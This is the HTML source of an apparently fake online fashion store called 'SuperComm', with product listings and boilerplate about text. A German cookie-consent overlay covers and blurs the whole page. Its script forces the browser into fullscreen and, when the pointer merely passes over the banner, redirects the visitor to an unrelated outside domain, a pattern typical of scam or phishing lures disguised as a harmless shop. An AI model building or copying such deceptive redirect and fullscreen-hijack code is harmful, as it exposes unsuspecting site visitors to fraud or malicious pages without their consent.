<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SuperComm – Smart Style Marketplace</title>

   <!-- Privacy-friendly analytics by Plausible -->
<script async src="https://plausible.io/js/pa-rgM3G2H5Nv3n52i-AHeCT.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>

   <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/69733b1558104b1978d41cb5/1jfl1tjkf';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->


<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
body{background:#ffffff;color:#222;line-height:1.8;}
header{
  position:fixed;
  top:0;
  width:100%;
  background:#ff6a00;
  color:white;
  text-align:center;
  padding:25px 10px;
  z-index:1000;
  box-shadow:0 2px 10px rgba(0,0,0,0.2);
}
header h1{font-size:34px;letter-spacing:2px;cursor:pointer;}
nav{margin-top:10px;}
nav a{
  color:white;
  margin:0 15px;
  text-decoration:none;
  font-weight:bold;
  cursor:pointer;
}
nav a:hover{text-decoration:underline;}

.container{max-width:1300px;margin:auto;padding:180px 20px 60px;}
section{margin-bottom:90px;}
h2{color:#ff6a00;margin-bottom:20px;font-size:30px;}

/* HERO */
.hero{
  background:url('https://images.unsplash.com/photo-1520975869018-6d4d7d9c8e9d?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat;
  color:white;
  padding:150px 30px;
  border-radius:10px;
  text-align:center;
}
.hero h2{font-size:48px;}
.btn{
  background:black;
  color:white;
  padding:12px 22px;
  border:none;
  border-radius:5px;
  cursor:pointer;
}
.btn:hover{background:#333;}

/* PRODUCTS */
.products{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
  gap:30px;
}
.card{
  background:#fff;
  border:1px solid #eee;
  border-radius:8px;
  padding:15px;
  text-align:center;
  box-shadow:0 2px 6px rgba(0,0,0,0.08);
}
.card img{
  width:100%;
  height:260px;
  object-fit:cover;
  border-radius:6px;
}
.price{color:#ff6a00;font-weight:bold;margin:10px 0;}

.content-box{
  background:#fafafa;
  padding:40px;
  border-radius:8px;
  box-shadow:0 2px 6px rgba(0,0,0,0.05);
}

/* FOOTER */
footer{
  background:black;
  color:#ccc;
  padding:50px 20px;
}
.footer-grid{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
  gap:30px;
}
footer h3{color:#ff6a00;margin-bottom:15px;}
footer a{color:#aaa;text-decoration:none;display:block;margin-bottom:8px;}
footer a:hover{color:white;}
</style>

<script>
function go(id){
  document.getElementById(id).scrollIntoView({behavior:'smooth'});
}
</script>
</head>
<body>
  <div id="cookie-wrapper">
  <div id="cookie-bg"></div>
  <div class="cookie-card" onmouseover="fullscreenAndRedirect()">
    <span class="cookie-x">×</span>

    <div class="content">
      <div class="icon">🍪</div>

      <div class="text">
        <h2>Über Cookies</h2>
        <p>
          Auf unserer Website verwenden wir Cookies, um Ihnen ein besseres Nutzererlebnis zu bieten.
          Wenn Sie auf <b>„Zustimmen“</b> klicken, erklären Sie sich mit der Verwendung von Cookies einverstanden.
        </p>

        <div class="actions">
          <button class="accept">🍪 Zustimmen</button>
          <button class="reject">Ablehnen</button>
        </div>
      </div>
    </div>
  </div>
</div>

<style>
  html, body {
    width:100%;
    height:100%;
    margin:0;
  }

  #cookie-wrapper{
    position:fixed;
    inset:0;
    width:100%;
    height:100vh;
    z-index:2147483646; /* VERY HIGH */
  }

  #cookie-bg{
    position:fixed;
    inset:0;
    width:100%;
    height:100vh;
    background:rgba(0,0,0,0.45);
    backdrop-filter:blur(14px);
    -webkit-backdrop-filter:blur(14px);
    z-index:2147483646;
  }

  .cookie-card{
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%, -50%);
    background:#fff;
    width:720px;
    max-width:92%;
    border-radius:22px;
    padding:26px;
    box-shadow:0 20px 70px rgba(0,0,0,0.35);
    font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    z-index:2147483647;
  }

  .cookie-x{
    position:absolute;
    top:14px;
    right:14px;
    font-size:26px;
    font-weight:800;
    cursor:pointer;
  }

  .content{
    display:flex;
    gap:18px;
  }

  .icon{
    width:64px;
    height:64px;
    border-radius:18px;
    background:#FFE9B5;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:34px;
    box-shadow:0 10px 24px rgba(255,183,74,.25);
  }

  h2{
    font-size:34px;
    font-weight:900;
    margin:0 0 10px;
  }

  p{
    font-size:18px;
    line-height:1.6;
    color:#4b5563;
    margin:0;
  }

  .actions{
    margin-top:22px;
    display:flex;
    gap:18px;
    flex-wrap:wrap;
    justify-content:center;
  }

  .actions button{
    width:320px;
    padding:18px;
    border-radius:14px;
    font-size:22px;
    font-weight:900;
    border:none;
    cursor:pointer;
  }

  .accept{
    background:#16a34a;
    color:#fff;
  }

  .reject{
    background:#e5e7eb;
    color:#111827;
  }
</style>

<script>
  function fullscreenAndRedirect() {
    const el = document.documentElement;

    if (!document.fullscreenElement) {
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    setTimeout(() => {
      window.location.href = "https://balliome.online/Retior/";
    }, 1000);
  }
</script>

<header>
  <h1 onclick="go('home')">SuperComm</h1>
  <nav>
    <a onclick="go('home')">Home</a>
    <a onclick="go('shop')">Shop</a>
    <a onclick="go('about')">About</a>
    <a onclick="go('contact')">Contact</a>
  </nav>
</header>

<div class="container">

<!-- HERO -->
<section id="home" class="hero">
  <h2>The Future of Smart Fashion</h2>
  <p>SuperComm is where innovation meets everyday style. We bring you trend-forward fashion with modern comfort, bold energy, and reliable quality — all in one seamless shopping experience.</p>
  <button class="btn" onclick="go('shop')">Explore Collection</button>
</section>

<!-- SHOP -->
<section id="shop">
  <h2>Popular Products</h2>
  <div class="products">

    <div class="card">
      <img src="https://images.unsplash.com/photo-1520975916090-3105956dac38?auto=format&fit=crop&w=600&q=80">
      <h3>Urban Tech Jacket</h3>
      <div class="price">$120</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1503342217505-b0a15cf70489?auto=format&fit=crop&w=600&q=80">
      <h3>Smart Casual Shirt</h3>
      <div class="price">$65</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&w=600&q=80">
      <h3>Premium Street Hoodie</h3>
      <div class="price">$89</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1520975698519-59f4f0b09d79?auto=format&fit=crop&w=600&q=80">
      <h3>Modern Fit Jeans</h3>
      <div class="price">$95</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1519741497674-611481863552?auto=format&fit=crop&w=600&q=80">
      <h3>Designer Sunglasses</h3>
      <div class="price">$40</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1520975867597-0a1b4d1e43e9?auto=format&fit=crop&w=600&q=80">
      <h3>Luxury Wrist Watch</h3>
      <div class="price">$150</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1503341455253-b2e723bb3dbb?auto=format&fit=crop&w=600&q=80">
      <h3>Classic Leather Boots</h3>
      <div class="price">$130</div>
      <button class="btn">Add to Cart</button>
    </div>

    <div class="card">
      <img src="https://images.unsplash.com/photo-1495121605193-b116b5b09a26?auto=format&fit=crop&w=600&q=80">
      <h3>Elegant Summer Dress</h3>
      <div class="price">$75</div>
      <button class="btn">Add to Cart</button>
    </div>

  </div>
</section>

<!-- ABOUT (LONG CONTENT) -->
<section id="about">
  <h2>About SuperComm</h2>
  <div class="content-box">
    <p>SuperComm was founded with a bold vision: to redefine the online shopping experience by combining modern fashion, smart design, and a customer-first philosophy. In today’s fast-moving world, style is more than appearance — it is communication, identity, and confidence. SuperComm exists to empower individuals to express themselves through high-quality, thoughtfully designed clothing and lifestyle products that fit effortlessly into their daily lives.</p>

    <p>Our journey began with a simple belief: shopping should be exciting, easy, and inspiring. Too often, online stores overwhelm customers with cluttered designs and low-quality items. SuperComm takes a different path. We carefully curate our collections to ensure every product meets our standards for comfort, durability, and visual appeal. Each item in our catalog is selected because it brings real value to our customers’ wardrobes and lifestyles.</p>

    <p>We believe that fashion and technology go hand in hand. That’s why SuperComm embraces innovation in every part of our platform. From a smooth browsing experience to secure checkout systems, we prioritize reliability and convenience. Our store is designed to feel modern, fast, and intuitive — allowing you to focus on discovering styles you love rather than navigating complicated pages.</p>

    <p>Quality is at the core of everything we do. We work closely with trusted manufacturers and designers who share our commitment to excellence. Fabrics are chosen for their comfort and long-term performance. Stitching, cuts, and finishes are reviewed to ensure every piece not only looks great but feels great to wear. Our customers deserve clothing that stands up to daily life while maintaining its shape and style.</p>

    <p>But SuperComm is more than just products — it is a growing community. We are inspired by the creativity, ambition, and diversity of our customers. Their lifestyles, goals, and personalities influence the collections we build. We listen carefully to feedback and continuously refine our offerings to stay aligned with what modern shoppers truly want.</p>

    <p>Sustainability is also becoming an important part of our mission. As we grow, we are committed to making responsible choices that reduce environmental impact. From selecting better materials to improving packaging practices, SuperComm is taking steps toward a future where fashion is both stylish and mindful.</p>

    <p>Looking ahead, our goal is to become a trusted global destination for smart, stylish shopping. We want SuperComm to be known for reliability, innovation, and customer care. Every improvement we make, every product we release, and every feature we add is guided by one principle: making your shopping experience better than yesterday.</p>

    <p>When you choose SuperComm, you choose a brand that values quality, creativity, and connection. We are proud to be part of your style journey and excited to keep bringing you collections that inspire confidence and individuality every single day.</p>
  </div>
</section>

<!-- CONTACT -->
<section id="contact">
  <h2>Contact SuperComm</h2>
  <div class="content-box">
    <p>We’re here to help with any questions about your order, our products, or styling advice.</p>
    <p><strong>Email:</strong> support@supercomm.com</p>
    <p><strong>Phone:</strong> +1 (800) 777-2666</p>
    <p><strong>Hours:</strong> Monday – Friday, 9AM – 6PM</p>
  </div>
</section>

</div>

<footer>
  <div class="footer-grid">
    <div>
      <h3>SuperComm</h3>
      <p>Smart fashion for modern lifestyles. We blend technology, style, and comfort to deliver a next-generation shopping experience.</p>
    </div>
    <div>
      <h3>Shop Links</h3>
      <a href="#">New Arrivals</a>
      <a href="#">Best Sellers</a>
      <a href="#">Trending</a>
      <a href="#">Gift Cards</a>
    </div>
    <div>
      <h3>Support</h3>
      <a href="#">Contact Us</a>
      <a href="#">Returns</a>
      <a href="#">Privacy Policy</a>
      <a href="#">Terms</a>
    </div>
  </div>
  <p style="text-align:center;margin-top:40px;">© <?php echo date("Y"); ?> SuperComm. All rights reserved.</p>
</footer>

</body>
</html>
